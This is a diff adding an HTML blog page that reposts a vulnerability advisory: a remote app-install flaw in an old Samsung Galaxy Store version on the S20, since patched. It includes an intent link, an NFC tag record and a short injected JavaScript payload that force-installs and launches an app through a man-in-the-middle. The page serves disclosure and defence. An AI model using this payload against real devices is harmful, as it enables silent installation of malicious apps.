@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Samsung S20 - RCE Via Samsung Galaxy Store | YayWebsiteYay (I suck at titles)</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Samsung S20 - RCE Via Samsung Galaxy Store" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Sometimes I want to publish stuff unfiltered." />
+<meta property="og:description" content="Sometimes I want to publish stuff unfiltered." />
+<link rel="canonical" href="http://localhost:4000/published-research/samsung-s20-rce-galaxy-store" />
+<meta property="og:url" content="http://localhost:4000/published-research/samsung-s20-rce-galaxy-store" />
+<meta property="og:site_name" content="YayWebsiteYay (I suck at titles)" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Samsung S20 - RCE Via Samsung Galaxy Store" />
+<script type="application/ld+json">
+{"@type":"WebPage","headline":"Samsung S20 - RCE Via Samsung Galaxy Store","url":"http://localhost:4000/published-research/samsung-s20-rce-galaxy-store","description":"Sometimes I want to publish stuff unfiltered.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="YayWebsiteYay (I suck at titles)" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">YayWebsiteYay (I suck at titles)</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/published-research/">Published Research</a><a class="page-link" href="/cves/">My CVEs</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">Samsung S20 - RCE Via Samsung Galaxy Store</h1>
+  </header>
+
+  <div class="post-content">
+    <h4 id="original-post-httpslabsf-securecomblogsamsung-s20-rce-via-samsung-galaxy-store-app">Original post: <a href="https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/">https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/</a></h4>
+
+<h2 id="description">Description</h2>
+
+<p>F-Secure looked into exploiting the Samsung S20 device for Tokyo Pwn2Own 2020. An exploit chain was found for version 4.5.19.13 of the Galaxy Store application that could have allowed an attacker to install any application on the Galaxy Store without user consent. Samsung patched this vulnerability at the end of September 2020, no longer making it a viable entry for Pwn2Own.</p>
+
+<p>This blog post will go over the technical details of this vulnerability and how F-Secure intended on exploiting this issue for Pwn2Own before it was patched.</p>
+
+<h2 id="technical-details">Technical Details</h2>
+
+<p>Galaxy Store (<code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps</code>) is the Samsung proprietary application store pre-installed on Samsung devices. The application is built to be a native Android application with a few WebView activities built in. Some of the WebView activities have JavaScript interfaces in order to provide additional functionality, such as installing and launching applications.</p>
+
+<p>The WebView activity that F-Secure intended to use for Pwn2Own was <code class="language-plaintext highlighter-rouge">com.sec.android.app.samsungapps.slotpage.EditorialActivity</code>. This activity could be launched via two methods:</p>
+
+<ul>
+  <li>Browsable intent link
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">intent://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html#Intent;action=android.intent.action.VIEW;scheme=http;end</code></li>
+    </ul>
+  </li>
+  <li>NFC Tag
+    <ul>
+      <li>Data MIME type: <code class="language-plaintext highlighter-rouge">application/com.sec.android.app.samsungapps.detail</code></li>
+      <li>Data URI: <code class="language-plaintext highlighter-rouge">http://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html</code></li>
+    </ul>
+  </li>
+</ul>
+
+<p>During runtime, the <code class="language-plaintext highlighter-rouge">EditorialActivity</code> activity loaded a WebView and checked if the user supplied <code class="language-plaintext highlighter-rouge">url</code> parameter was considered valid. The parameter was considered valid if it started with one of the two following values:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">http://img.samsungapps.com/</code></li>
+  <li><code class="language-plaintext highlighter-rouge">https://img.samsungapps.com/</code></li>
+</ul>
+
+<p>The method used to check the “url” parameter is below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean isValidUrl(String str) {
+        return str.startsWith("http://img.samsungapps.com/") || 
+        str.startsWith("https://img.samsungapps.com/");
+}
+</code></pre></div></div>
+
+<p>If the above method returned true, then the WebView would proceed to load the user supplied URL and add a JavaScript interface to the WebView called <code class="language-plaintext highlighter-rouge">EditorialScriptInterface</code>. This interface contained two methods of interest: <code class="language-plaintext highlighter-rouge">downloadApp</code> and <code class="language-plaintext highlighter-rouge">openApp</code>.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">downloadApp</code> method took a string value and passed that value to another method <code class="language-plaintext highlighter-rouge">e</code>. This new method executed the following actions:</p>
+
+<ul>
+  <li>Checks if the WebView is loaded into a valid URL, using the same “isValidUrl” method above</li>
+  <li>Requests to download an app from the Galaxy Store that had the same package name as the previously passed string value</li>
+  <li>If the package is found, download and install the package</li>
+</ul>
+
+<p>The following pseudo code demonstrates how this entire process worked:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@JavascriptInterface
+public void downloadApp(String str) {
+        EditorialScriptInterface.this.e(str);
+}
+public void e(String str) {
+        if (EditorialActivity.isValidUrl(WebView.getUrl() == false)) {
+                Log.d("Editorial", 
+                "Url is not valid" + 
+                EditorialActivity.isValidUrl(WebView.getUrl());
+                return;
+        }
+        String GUID = str;
+        if (Store.search(GUID) == true) {
+                Store.download(GUID);
+        }
+}
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">openApp</code> method had similar functionality, where it would pass a string value to the method <code class="language-plaintext highlighter-rouge">d</code> and executed the following actions:</p>
+
+<ul>
+  <li>Checks if the WebView is loaded into a valid URL, using the same “isValidUrl” method above</li>
+  <li>Attempts to launch an installed app with the same package name as the supplied string value</li>
+</ul>
+
+<p>The following pseudo code demonstrates how this entire process works:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@JavascriptInterface
+public void openApp(String str) {
+        EditorialScriptInterface.this.d(str);
+}
+public void d(String str) {
+        if (EditorialActivity.isValidUrl(WebView.getUrl() == false)) {
+                Log.d("Editorial",
+                "Url is not valid" +
+                this.c.getUrl());
+                return;
+        }
+        String GUID = str;
+        if (Device.isInstalled(GUID) == true) {
+                Device.openApp(GUID);
+        }
+}
+</code></pre></div></div>
+
+<h2 id="attack-chain">Attack Chain</h2>
+
+<p>A high level overview of the chain that F-Secure intended to use for Pwn2Own was:</p>
+
+<ul>
+  <li>Phone is connected to an attacker controlled WiFi network or a public WiFi network the attacker resides on</li>
+  <li>Phone scans a prepared NFC tag and launches the Galaxy Store application</li>
+  <li>The Galaxy Store application automatically launches the <code class="language-plaintext highlighter-rouge">EditorialActivity</code> activity which also loads the JavaScript interface <code class="language-plaintext highlighter-rouge">EditorialScriptInterface</code></li>
+  <li>The loaded WebView browses to the URL <code class="language-plaintext highlighter-rouge">http://img.samsungapps.com/yaypayloadyay.html</code></li>
+  <li>The attacker intercepts the HTTP traffic and injects malicious JavaScript into the server’s response</li>
+  <li>Force the phone to install a malicious application from the Galaxy Store that the attacker has uploaded</li>
+  <li>Force the phone to launch the newly installed malicious application</li>
+</ul>
+
+<h2 id="nfc-ndef">NFC NDEF</h2>
+
+<p>A NFC tag can contain a number of NDEF records for exchanging information with a phone scanning it. F-Secure intended to use a NFC tag with the following record:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Record 0: (Media) application/com.sec.android.app.samsungapps.detail
+        http://apps.samsung.com/appquery/EditorialPage.as?url=
+        http://img.samsungapps.com/yaypayloadyay.html
+</code></pre></div></div>
+
+<h2 id="man-in-the-middle-attack">Man in the Middle Attack</h2>
+
+<p>If a Samsung S20 device scanned the above NFC tag, the Galaxy Store application would open the <code class="language-plaintext highlighter-rouge">EditorialActivity</code> activity which launches a WebView and loads the URL <code class="language-plaintext highlighter-rouge">http://img.samsungapps.com/yaypayloadyay.html</code>. This WebView would also contain the JavaScript interface <code class="language-plaintext highlighter-rouge">EditorialScriptInterface</code>.</p>
+
+<p>Since the web page <code class="language-plaintext highlighter-rouge">http://img.samsungapps.com/yaypayloadyay.html</code> does not exist, the web server would respond with a “404 Not Found” HTTP error. However, due to the communications using clear text HTTP, it would be possible for a correctly positioned attacker to conduct a Man-in-the-Middle (MitM) attack and inject additional JavaScript into the server’s HTTP response.</p>
+
+<p>The following example JavaScript code could be injected into the server’s HTTP response to automatically download and install any application from the Galaxy Store, and then trigger the opening of that application:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+function openApp(){
+        setTimeout(function(){
+                GalaxyStore.openApp("&lt;packageName&gt;");
+        },5000);
+}
+
+// download and install "&lt;packageName&gt;"
+GalaxyStore.downloadApp("&lt;packageName&gt;");
+// open "&lt;packagename&gt;" 5 seconds after this page has loaded
+openApp();
+&lt;/script&gt;
+</code></pre></div></div>
+
+<h2 id="remediation-and-mitigation">Remediation and Mitigation</h2>
+
+<p>Samsung has released version 4.5.20.7 of the Galaxy Store application, which modified the <code class="language-plaintext highlighter-rouge">isValidUrl</code> method to the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public boolean isValidUrl(String str) {
+        return str.startsWith("https://img.samsungapps.com/");
+}
+</code></pre></div></div>
+
+<p>As per above, the <code class="language-plaintext highlighter-rouge">url</code> parameter must now start with <code class="language-plaintext highlighter-rouge">https://img.samsungapps.com/</code>, which makes MitM attacks significantly more difficult. This change affects:</p>
+
+<ul>
+  <li>If the “EditorialActivity” WebView is able to load the user provided URL</li>
+  <li>If the “downloadApp” JavaScript interface method is allowed to execute</li>
+  <li>If the “openApp” JavaScript interface method is allowed to execute</li>
+</ul>
+
+<p>It should be noted that this new version of the Galaxy Store may not come pre-installed with the October 2020 firmware for Samsung S20 devices. If this is the case, a user must manually open the Galaxy Store application, which will then prompt the user to install a newer version of the application.</p>
+
+<p>F-Secure found that if a user is still running a vulnerable version of the Galaxy Store application, and is never prompted to update their application, then this attack is still exploitable against that specific user. This is because launching the “EditorialActivity” activity skips all update checks that the Galaxy Store application should be running on boot.</p>
+
+<p>It is recommended that all Samsung S20 users (and potentially all Samsung device users in general) open their Galaxy Store application at least once so that they are prompted to update to the latest version.</p>
+
+  </div>
+
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">YayWebsiteYay (I suck at titles)</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">YayWebsiteYay (I suck at titles)</li><li><a class="u-email" href="mailto:Fake_email_link">Fake_email_link</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">yogehi</span></a></li><li><a href="https://www.twitter.com/yogehi"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">yogehi</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>Sometimes I want to publish stuff unfiltered.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
